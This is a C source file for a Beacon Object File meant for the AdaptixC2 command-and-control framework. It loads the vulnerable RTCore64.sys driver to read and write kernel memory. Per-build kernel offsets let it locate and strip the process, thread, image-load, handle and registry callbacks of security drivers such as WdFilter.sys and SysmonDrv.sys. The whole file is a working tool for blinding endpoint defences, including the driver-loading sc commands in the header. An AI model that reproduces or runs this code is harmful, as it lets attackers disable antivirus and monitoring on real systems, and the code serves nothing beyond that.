/*
 * remove_callback_bof.c
 * Uso (AdaptixC2):
 *   remove_callback <driver.sys>
 *   remove_callback WdFilter.sys
 *   remove_callback SysmonDrv.sys
 *
 * Requires RTCore64.sys loaded:
 *   sc create RTCore64 type= kernel binPath= C:\Windows\System32\drivers\RTCore64.sys start= demand
 *   sc start RTCore64
 */

#include <windows.h>
#include "beacon.h"



#define RTCORE64_MEMORY_READ_IOCTL  0x80002048
#define RTCORE64_MEMORY_WRITE_IOCTL 0x8000204c
#define RTCORE64_DEVICE_NAME        "\\\\.\\RTCore64"

typedef struct {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   ReadSize;
    DWORD   Value;
    BYTE    Pad3[16];
} RTCORE64_MEMORY;

/* ─── WINAPI declarations ─────────────────────────────────────────────────── */

DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD,
                                                         LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
                                                     DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

DECLSPEC_IMPORT BOOL    WINAPI PSAPI$EnumDeviceDrivers(LPVOID*, DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI PSAPI$GetDeviceDriverBaseNameA(LPVOID, LPSTR, DWORD);

DECLSPEC_IMPORT DWORD   WINAPI VERSION$GetFileVersionInfoSizeA(LPCSTR, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI VERSION$GetFileVersionInfoA(LPCSTR, DWORD, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL    WINAPI VERSION$VerQueryValueA(LPCVOID, LPCSTR, LPVOID*, PUINT);

/* ─── Kernel offset table ─────────────────────────────────────────────────── */

typedef struct {
    DWORD   build;
    DWORD   revision;
    DWORD64 PspCreateProcessNotifyRoutine;
    DWORD64 PspCreateThreadNotifyRoutine;
    DWORD64 PspLoadImageNotifyRoutine;
    DWORD64 PspCreateProcessNotifyRoutineCount;
    DWORD64 PspCreateThreadNotifyRoutineCount;
    DWORD64 PspLoadImageNotifyRoutineCount;
    DWORD64 CallbackListHead;
    DWORD64 PsProcessType;
    DWORD64 PsThreadType;
} KERNEL_OFFSETS;

static const KERNEL_OFFSETS g_offsets[] = {

    /*
     * Build 26100.7824
     * SHA256 : 54f57116bcbbe96da72088130a8f949e13884a3db39d81f4b80cb26a88de00ac
     */
    {
        26100, 7824,
        0x00F05040,  /* PspCreateProcessNotifyRoutine      */
        0x00F05440,  /* PspCreateThreadNotifyRoutine       */
        0x00F05240,  /* PspLoadImageNotifyRoutine          */
        0x00FD8E0C,  /* PspCreateProcessNotifyRoutineCount */
        0x00FD8E04,  /* PspCreateThreadNotifyRoutineCount  */
        0x00FD8DFC,  /* PspLoadImageNotifyRoutineCount     */
        0x00EF76E0,  /* CallbackListHead                   */
        0x00FC5A98,  /* PsProcessType                      */
        0x00FC5AD0,  /* PsThreadType                       */
    },

    /*
     * Build 22621.6630
     * SHA256 : f1e5edf5175327d22c10eb2248456070b46b78db5dfdbc665d3b30fd570eefee
     */
    {
        22621, 6630,
        0x00D0C940,
        0x00D0C740,
        0x00D0C540,
        0x00D54D1C,
        0x00D54D20,
        0x00D54D28,
        0x00C14820,  /* CallbackListHead */
        0x00D1EA58,
        0x00D1EA80,
    },

    /*
     * Build 19041.6456
     * SHA256 : 563f486f45853248e54b3ee800d6b19289101c6cca15e0e3fa11a70452b5ce91
     */
    {
        19041, 6456,
        0x00CEC7E0,
        0x00CEC5E0,
        0x00CEC3E0,
        0x00D2E9D0,
        0x00D2E9D8,
        0x00D2E9DC,
        0x00C48590,  /* CallbackListHead */
        0x00CFC410,
        0x00CFC440,
    },

    /*
     * Build 20348.587
     * SHA256 : 5669b9b8bfcf20f08b7d1d65dc2deccbf836279c0e3f66722d72ad33ee7f672a
     */
    {
        20348, 587,
        0x00CFFC00,
        0x00CFFE00,
        0x00D00000,
        0x00D476D8,
        0x00D476D0,
        0x00D476CC,
        0x00C539A0,  /* CallbackListHead */
        0x00D107D0,
        0x00D10800,
    },

    {
        26100,
        7920,
        0x00F05520,  /* PspCreateProcessNotifyRoutine      */
        0x00F05320,  /* PspCreateThreadNotifyRoutine       */
        0x00F05120,  /* PspLoadImageNotifyRoutine          */
        0x00FD8E0C,  /* PspCreateProcessNotifyRoutineCount */
        0x00FD8E04,  /* PspCreateThreadNotifyRoutineCount  */
        0x00FD8DFC,  /* PspLoadImageNotifyRoutineCount     */
        0x00EF77D0,  /* CallbackListHead                   */
        0x00FC5A98,  /* PsProcessType                      */
        0x00FC5AC8,  /* PsThreadType                       */
    },

};

#define NUM_OFFSETS (sizeof(g_offsets) / sizeof(g_offsets[0]))



#define SystemModuleInformation 11
#define MOD_BUF_SIZE (1024 * 1024)

typedef struct {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   FullPathName[256];
} SYSTEM_MODULE;

typedef struct {
    ULONG         ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION;

static SYSTEM_MODULE_INFORMATION* alloc_module_list(void)
{
    PVOID buf = KERNEL32$VirtualAlloc(NULL, MOD_BUF_SIZE,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return NULL;
    ULONG needed = 0;
    if (NTDLL$NtQuerySystemInformation(SystemModuleInformation,
                                        buf, MOD_BUF_SIZE, &needed) != 0) {
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return NULL;
    }
    return (SYSTEM_MODULE_INFORMATION*)buf;
}

static int ci_eq(const char* a, const char* b);

#define MAX_DRIVERS 512

static DWORD64 get_kernel_base(SYSTEM_MODULE_INFORMATION* info)
{
    static LPVOID drivers[MAX_DRIVERS];
    DWORD  needed = 0;
    if (PSAPI$EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        char name[64];
        DWORD count = needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            name[0] = '\0';
            PSAPI$GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name));
            if ((name[0]=='n'||name[0]=='N') && (name[1]=='t'||name[1]=='T') &&
                ((name[2]=='o'||name[2]=='O') || (name[2]=='k'||name[2]=='K')))
                return (DWORD64)drivers[i];
        }
    }
    if (!info || info->ModulesCount == 0) return 0;
    for (ULONG i = 0; i < info->ModulesCount; i++) {
        const char* name = info->Modules[i].FullPathName +
                           info->Modules[i].ModuleNameOffset;
        if ((name[0]=='n'||name[0]=='N') && (name[1]=='t'||name[1]=='T') &&
            ((name[2]=='o'||name[2]=='O') || (name[2]=='k'||name[2]=='K')))
            return (DWORD64)info->Modules[i].ImageBase;
    }
    return (DWORD64)info->Modules[0].ImageBase;
}

static void patch_module_bases(SYSTEM_MODULE_INFORMATION* info)
{
    static LPVOID drivers[MAX_DRIVERS];
    DWORD  needed = 0;
    if (!PSAPI$EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return;
    DWORD count = needed / sizeof(LPVOID);
    for (ULONG i = 0; i < info->ModulesCount; i++) {
        if ((DWORD64)info->Modules[i].ImageBase != 0) continue;
        const char* modname = info->Modules[i].FullPathName +
                              info->Modules[i].ModuleNameOffset;
        char drvname[64];
        for (DWORD d = 0; d < count; d++) {
            drvname[0] = '\0';
            PSAPI$GetDeviceDriverBaseNameA(drivers[d], drvname, sizeof(drvname));
            if (ci_eq(modname, drvname)) {
                info->Modules[i].ImageBase = drivers[d];
                break;
            }
        }
    }
}

/* ─── Version helper ──────────────────────────────────────────────────────── */

static void get_ntoskrnl_version(DWORD* build, DWORD* revision)
{
    DWORD handle = 0;
    DWORD size = VERSION$GetFileVersionInfoSizeA(
        "C:\\Windows\\System32\\ntoskrnl.exe", &handle);
    if (!size) { *build = *revision = 0; return; }

    char* buf = KERNEL32$VirtualAlloc(NULL, size,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { *build = *revision = 0; return; }

    VERSION$GetFileVersionInfoA("C:\\Windows\\System32\\ntoskrnl.exe",
                                 handle, size, buf);
    VS_FIXEDFILEINFO* ver = NULL;
    UINT len = 0;
    VERSION$VerQueryValueA(buf, "\\", (LPVOID*)&ver, &len);
    *build    = HIWORD(ver->dwFileVersionLS);
    *revision = LOWORD(ver->dwFileVersionLS);
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}

static const KERNEL_OFFSETS* find_offsets(DWORD build, DWORD revision)
{
    for (SIZE_T i = 0; i < NUM_OFFSETS; i++)
        if (g_offsets[i].build == build && g_offsets[i].revision == revision)
            return &g_offsets[i];
    return NULL;
}

/* ─── RTCore64 read/write ─────────────────────────────────────────────────── */

static DWORD64 rtcore_read64(HANDLE hDrv, DWORD64 addr)
{
    RTCORE64_MEMORY m = {0};
    DWORD ret = 0;
    m.Address = addr; m.ReadSize = 4;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
        &m, sizeof(m), &m, sizeof(m), &ret, NULL);
    DWORD64 lo = m.Value;
    m.Address = addr + 4; m.ReadSize = 4; m.Value = 0;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
        &m, sizeof(m), &m, sizeof(m), &ret, NULL);
    return lo | ((DWORD64)m.Value << 32);
}

static DWORD rtcore_read32(HANDLE hDrv, DWORD64 addr)
{
    RTCORE64_MEMORY m = {0};
    DWORD ret = 0;
    m.Address = addr; m.ReadSize = 4;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_READ_IOCTL,
        &m, sizeof(m), &m, sizeof(m), &ret, NULL);
    return m.Value;
}

static void rtcore_write32(HANDLE hDrv, DWORD64 addr, DWORD value)
{
    RTCORE64_MEMORY m = {0};
    DWORD ret = 0;
    m.Address  = addr;
    m.ReadSize = 4;
    m.Value    = value;
    KERNEL32$DeviceIoControl(hDrv, RTCORE64_MEMORY_WRITE_IOCTL,
        &m, sizeof(m), &m, sizeof(m), &ret, NULL);
}

static void rtcore_write64(HANDLE hDrv, DWORD64 addr, DWORD64 value)
{
    rtcore_write32(hDrv, addr,     (DWORD)(value & 0xFFFFFFFF));
    rtcore_write32(hDrv, addr + 4, (DWORD)(value >> 32));
}

/* ─── Driver name helpers (no CRT) ───────────────────────────────────────── */

static int bof_strlen(const char* s)
{
    int n = 0; while (s[n]) n++; return n;
}


static int ci_eq(const char* a, const char* b)
{
    while (*a && *b) {
        char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
        char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}


static int ci_suffix(const char* haystack, const char* needle)
{
    int hlen = bof_strlen(haystack);
    int nlen = bof_strlen(needle);
    if (nlen > hlen) return 0;
    return ci_eq(haystack + hlen - nlen, needle);
}

static const char* resolve_driver(SYSTEM_MODULE_INFORMATION* info, DWORD64 ptr)
{
    for (ULONG i = 0; i < info->ModulesCount; i++) {
        SYSTEM_MODULE* m = &info->Modules[i];
        DWORD64 base = (DWORD64)m->ImageBase;
        if (ptr >= base && ptr < base + m->ImageSize)
            return m->FullPathName + m->ModuleNameOffset;
    }
    return "unknown";
}

#define MAX_CALLBACKS 64

static int remove_notify(HANDLE hDrv,
                          SYSTEM_MODULE_INFORMATION* modinfo,
                          DWORD64 array_va,
                          DWORD64 count_va,
                          const char* target,
                          const char* label)
{
    int removed = 0;

    for (DWORD i = 0; i < MAX_CALLBACKS; i++) {
        DWORD64 slot = rtcore_read64(hDrv, array_va + i * 8);
        if (!slot || !(slot & 1)) continue;

        DWORD64 block = slot & ~(DWORD64)0xf;
        DWORD64 fn    = rtcore_read64(hDrv, block + 8);
        const char* drv = resolve_driver(modinfo, fn);

        if (!ci_suffix(drv, target)) continue;

        rtcore_write64(hDrv, array_va + i * 8, 0);

        DWORD cur = rtcore_read32(hDrv, count_va);
        if (cur > 0)
            rtcore_write32(hDrv, count_va, cur - 1);

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Removed %s notify callback [slot %lu] -> %s\r\n",
            label, i, drv);
        removed++;
    }

    return removed;
}

#define OB_ENTRY_ENABLED_OFF 20
#define OB_ENTRY_PRE_OFF     32
#define OB_ENTRY_POST_OFF    40
#define OB_CALLBACK_LIST_OFF 0xC8

static int remove_object_callbacks(HANDLE hDrv,
                                    SYSTEM_MODULE_INFORMATION* modinfo,
                                    DWORD64 list_head_va,
                                    const char* target,
                                    const char* label)
{
    int removed = 0;
    DWORD64 flink = rtcore_read64(hDrv, list_head_va);
    int guard = 0;

    while (flink != list_head_va && flink != 0 && guard < 32) {
        guard++;

        BYTE enabled = (BYTE)(rtcore_read32(hDrv, flink + OB_ENTRY_ENABLED_OFF) & 0xFF);
        if (!enabled) {
            flink = rtcore_read64(hDrv, flink);
            continue;
        }

        DWORD64 pre  = rtcore_read64(hDrv, flink + OB_ENTRY_PRE_OFF);
        DWORD64 post = rtcore_read64(hDrv, flink + OB_ENTRY_POST_OFF);
        DWORD64 fn   = pre ? pre : post;

        if (fn) {
            const char* drv = resolve_driver(modinfo, fn);
            if (ci_suffix(drv, target)) {
                /* Patch Enabled = 0 */
                DWORD dword_field = rtcore_read32(hDrv, flink + OB_ENTRY_ENABLED_OFF);
                dword_field &= 0xFFFFFF00; /* zero the BOOLEAN byte, preserve padding */
                rtcore_write32(hDrv, flink + OB_ENTRY_ENABLED_OFF, dword_field);

                BeaconPrintf(CALLBACK_OUTPUT,
                    "[+] Disabled %s object callback @ 0x%llX -> %s\r\n",
                    label, flink, drv);
                removed++;
            }
        }

        flink = rtcore_read64(hDrv, flink);
    }

    return removed;
}

#define CM_ENTRY_FLINK_OFF  0
#define CM_ENTRY_BLINK_OFF  8

static DWORD64 probe_cm_fn_offset(HANDLE hDrv,
                                   SYSTEM_MODULE_INFORMATION* modinfo,
                                   DWORD64 first_entry)
{
    DWORD probes[] = {32, 40, 48, 56, 64};
    for (int i = 0; i < 5; i++) {
        DWORD64 candidate = rtcore_read64(hDrv, first_entry + probes[i]);
        if (!candidate) continue;
        const char* drv = resolve_driver(modinfo, candidate);
        if (drv[0] != 'u')
            return probes[i];
    }
    return 48; /* fallback */
}

static int remove_registry_callbacks(HANDLE hDrv,
                                      SYSTEM_MODULE_INFORMATION* modinfo,
                                      DWORD64 list_head_va,
                                      const char* target)
{
    if (!list_head_va) return 0;

    DWORD64 flink = rtcore_read64(hDrv, list_head_va);
    if (flink == list_head_va || flink == 0) return 0;

    DWORD64 fn_off = probe_cm_fn_offset(hDrv, modinfo, flink);

    int removed = 0;
    int guard = 0;
    DWORD64 entry = flink;

    while (entry != list_head_va && entry != 0 && guard < 64) {
        guard++;
        DWORD64 next  = rtcore_read64(hDrv, entry + CM_ENTRY_FLINK_OFF);
        DWORD64 fn    = rtcore_read64(hDrv, entry + fn_off);

        if (fn) {
            const char* drv = resolve_driver(modinfo, fn);
            if (ci_suffix(drv, target)) {
                /* Unlink from list */
                DWORD64 blink = rtcore_read64(hDrv, entry + CM_ENTRY_BLINK_OFF);
                rtcore_write64(hDrv, blink + CM_ENTRY_FLINK_OFF, next);
                rtcore_write64(hDrv, next  + CM_ENTRY_BLINK_OFF, blink);
                /* Zero function pointer */
                rtcore_write64(hDrv, entry + fn_off, 0);

                BeaconPrintf(CALLBACK_OUTPUT,
                    "[+] Removed Registry callback @ 0x%llX -> %s\r\n",
                    entry, drv);
                removed++;
            }
        }
        entry = next;
    }
    return removed;
}

void go(char* args, int len)
{

    datap parser;
    BeaconDataParse(&parser, args, len);
    wchar_t* target_w = (wchar_t*)BeaconDataExtract(&parser, NULL);

    if (!target_w || target_w[0] == L'\0') {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Usage: remove_callback <driver.sys>\r\n"
            "    Example: remove_callback SysmonDrv.sys\r\n");
        return;
    }

    char target[64] = {0};
    for (int i = 0; i < 63 && target_w[i]; i++)
        target[i] = (char)(target_w[i] & 0xFF);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Target driver: %s\r\n", target);

    DWORD build, revision;
    get_ntoskrnl_version(&build, &revision);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] ntoskrnl version: 10.0.%lu.%lu\r\n", build, revision);


    const KERNEL_OFFSETS* off = find_offsets(build, revision);
    if (!off) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No offsets for build %lu.%lu — add entry to g_offsets[].\r\n",
            build, revision);
        return;
    }

    SYSTEM_MODULE_INFORMATION* modinfo = alloc_module_list();
    if (!modinfo) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to query module list\r\n");
        return;
    }

    patch_module_bases(modinfo);

    DWORD64 kbase = get_kernel_base(modinfo);
    if (!kbase) {
        KERNEL32$VirtualFree(modinfo, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[-] ntoskrnl base not found\r\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ntoskrnl base: 0x%llX\r\n", kbase);

    /* Kernel VAs */
    DWORD64 va_proc       = kbase + off->PspCreateProcessNotifyRoutine;
    DWORD64 va_thread     = kbase + off->PspCreateThreadNotifyRoutine;
    DWORD64 va_image      = kbase + off->PspLoadImageNotifyRoutine;
    DWORD64 va_cnt_proc   = kbase + off->PspCreateProcessNotifyRoutineCount;
    DWORD64 va_cnt_thread = kbase + off->PspCreateThreadNotifyRoutineCount;
    DWORD64 va_cnt_image  = kbase + off->PspLoadImageNotifyRoutineCount;
    DWORD64 va_psprocess  = kbase + off->PsProcessType;
    DWORD64 va_psthread   = kbase + off->PsThreadType;
    DWORD64 va_cblist     = off->CallbackListHead ? kbase + off->CallbackListHead : 0;

    /* Open RTCore64 */
    HANDLE hDrv = KERNEL32$CreateFileA(
        RTCORE64_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDrv == INVALID_HANDLE_VALUE) {
        KERNEL32$VirtualFree(modinfo, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] Failed to open RTCore64 (error %lu)\r\n"
            "    sc start RTCore64\r\n",
            KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] RTCore64 device opened\r\n\r\n");

    int total = 0;

    /* Notify callbacks */
    total += remove_notify(hDrv, modinfo, va_proc,   va_cnt_proc,   target, "Process");
    total += remove_notify(hDrv, modinfo, va_thread, va_cnt_thread, target, "Thread");
    total += remove_notify(hDrv, modinfo, va_image,  va_cnt_image,  target, "ImageLoad");

    /* Object callbacks */
    DWORD64 proc_type_ptr   = rtcore_read64(hDrv, va_psprocess);
    DWORD64 thread_type_ptr = rtcore_read64(hDrv, va_psthread);

    total += remove_object_callbacks(hDrv, modinfo,
                 proc_type_ptr   + OB_CALLBACK_LIST_OFF, target, "ProcHandle");
    total += remove_object_callbacks(hDrv, modinfo,
                 thread_type_ptr + OB_CALLBACK_LIST_OFF, target, "ThreadHandle");

    /* Registry callbacks */
    total += remove_registry_callbacks(hDrv, modinfo, va_cblist, target);

    /* Summary */
    BeaconPrintf(CALLBACK_OUTPUT, "\r\n");
    if (total > 0)
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Done — %d callback(s) removed/disabled for %s\r\n",
            total, target);
    else
        BeaconPrintf(CALLBACK_OUTPUT,
            "[-] No callbacks found for %s (driver not loaded or build not matched)\r\n",
            target);

    KERNEL32$CloseHandle(hDrv);
    KERNEL32$VirtualFree(modinfo, 0, MEM_RELEASE);
}
